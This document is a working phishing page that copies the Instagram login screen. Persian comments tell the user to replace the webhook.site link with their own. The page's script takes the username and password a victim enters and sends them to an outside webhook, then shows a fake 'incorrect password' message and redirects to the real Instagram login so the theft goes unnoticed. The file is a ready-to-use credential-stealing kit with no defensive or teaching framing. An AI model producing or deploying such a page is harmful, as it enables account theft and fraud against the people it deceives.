<!DOCTYPE html>
<html>
<head>
    <title>Instagram</title>
    <meta charset="UTF-8">
    <style>
        body {
            background: #fafafa;
            font-family: Arial;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .box {
            background: white;
            border: 1px solid #dbdbdb;
            padding: 40px;
            width: 300px;
            text-align: center;
        }
        h1 {
            font-size: 40px;
            margin-bottom: 30px;
            font-style: italic;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 5px 0;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background: #fafafa;
            font-size: 12px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 8px;
            background: #0095f6;
            color: white;
            border: none;
            border-radius: 4px;
            font-weight: bold;
            margin-top: 15px;
            cursor: pointer;
            font-size: 14px;
        }
        .error {
            color: #ed4956;
            margin-top: 15px;
            display: none;
            font-size: 13px;
        }
    </style>
</head>
<body>
    <div class="box">
        <h1>Instagram</h1>
        <form id="myForm">
            <input type="text" id="username" placeholder="Phone number, username, or email">
            <input type="password" id="password" placeholder="Password">
            <button type="submit">Log In</button>
        </form>
        <div class="error" id="errorMsg">
            Sorry, your password was incorrect. Please double-check your password.
        </div>
    </div>
    
    <script>
        // ⚠️ اینجا لینک webhook.site خودت رو جایگزین کن
        const WEBHOOK = "https://webhook.site/e33ce720-3db9-4ea8-981c-93c916ee8698";
        
        document.getElementById('myForm').onsubmit = async function(e) {
            e.preventDefault();
            
            var user = document.getElementById('username').value;
            var pass = document.getElementById('password').value;
            
            // ارسال اطلاعات به webhook
            await fetch(WEBHOOK, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    username: user,
                    password: pass,
                    time: new Date().toLocaleString('fa-IR')
                })
            });
            
            // نمایش خطا مثل اینستاگرام واقعی
            document.getElementById('errorMsg').style.display = 'block';
            document.getElementById('password').value = '';
            
            // بعد از 3 ثانیه برو به اینستاگرام واقعی
            setTimeout(function() {
                window.location.href = 'https://www.instagram.com/accounts/login/';
            }, 3000);
        };
    </script>
</body>
</html>
